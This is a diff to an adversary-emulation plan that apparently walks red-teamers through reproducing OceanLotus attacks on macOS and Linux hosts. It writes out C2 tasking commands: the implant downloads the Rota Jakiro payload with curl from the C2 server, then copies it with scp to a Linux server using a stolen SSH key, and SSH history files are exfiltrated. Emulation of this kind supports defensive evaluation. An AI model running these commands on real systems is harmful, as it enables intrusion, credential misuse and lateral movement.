@@ -245,6 +245,7 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
    ```
+   
    Expected Output: 
    ```
    [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
@@ -283,6 +284,7 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
       1. Continue hacking...
 
    </details>
+   
 <br>
 
 ### 🔮 Reference Code & Reporting
@@ -326,9 +328,7 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
 
 ## Step 2 - macOS Discovery
 ### 📖 Overview
-Step 2 emulates OceanLotus conducting discovery on a macOS host. 
-
-Search for local credentials on the macOS host and use the known_hosts file to move laterally.
+**Step 2** emulates OceanLotus conducting discovery on a macOS host. OceanLotus reviews the contents of the `.ssh` folder. Seeing there is an SSH key, the `known_hosts` and `history` files are exfiled to the C2 server for analysis. The history file reveals Hope Potter sends files to the file server using SCP. 
 
 > CTI Note: There is no open-source reporting to support using the known_hosts file in conjunction with local SSH keys 😿. During our research, we did not find reporting detailing credential collection on macOS. In order to perform lateral movement for the linux portion of our sceario and staying consistent with using native OS utilities seen in other reporting, we chose to use known_hosts discovery with locally stored SSH keys. 
 
@@ -418,11 +418,9 @@ Search for local credentials on the macOS host and use the known_hosts file to m
 
 ## Step 3 - Lateral Movement
 ### 📖 Overview
-Identified the macOS connects to a Linux file server. 
- 
-Download Rota Jakiro and scp Rota Jakiro to the Linux server
- 
-Execute Rota Jakiro
+**Step 3** emulates OceanLotus transfering tools into the victim enviornment for targeted platforms. 
+
+OceanLotus downloads Rota Jakiro to the macOS host in the `/Users/hpotter/Library/WebKit` folder (the execution folder for OSX.OceanLotus) as `osx.download`. OSX.OceanLotus then uses SCP to transfer Rota Jakiro to the `\tmp` folder of the Linux host. Using SSH, OSX.OceanLotus changes Rota Jakiro to an executable and executes Rota Jakiro on the Linux host.
 
 ---
 ### 👾 Red Team Procedures
@@ -455,41 +453,41 @@ Execute Rota Jakiro
    💡 All files are downloaded to the directory where the OSX implant binary is running, `/Users/hpotter/Library/WebKit`, as `osx.download`. `/Users/hpotter/Library/WebKit` is where the OSX implant binary is dropped from the application bundle.
 
    
-<details>
-    <summary>Troubleshooting</summary>
-   ---
-    On the C2 server start a simple HTTP server
+   <details>
+      <summary>Troubleshooting</summary>
+      ---
+      
+      On the C2 server start a simple HTTP server
+      
+      ```
+      cd /opt/oceanlotus/Resources/payloads
+      ```
+      
+      <br>
+      
+      ```
+      python3 -m http.server
+      ```
+      
+      Task the implant
+      
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
+      ```
+      
+      Verify the file downloaded
+      
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
+      ```
+      
+      End Troubleshooting
+      
+      ---
+       
+   </details>
 
-    ```
-    cd /opt/oceanlotus/Resources/payloads
-    ```
-
-    <br>
-
-    ```
-    python3 -m http.server
-    ```
-
-    Task the implant
-
-    ```
-    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
-    ```
-
-    Verify the file downloaded
-
-    ```
-    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /tmp/rota"}'
-    ```
-    End Troubleshooting
-   
-   End Troubleshooting
-
-    ---
-    
-</details>
-
-1. Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
+1. Task OSX.OceanLotus to SCP the Rota Jakiro implant from the macOS host to the Linux host
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tmp/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
    ```
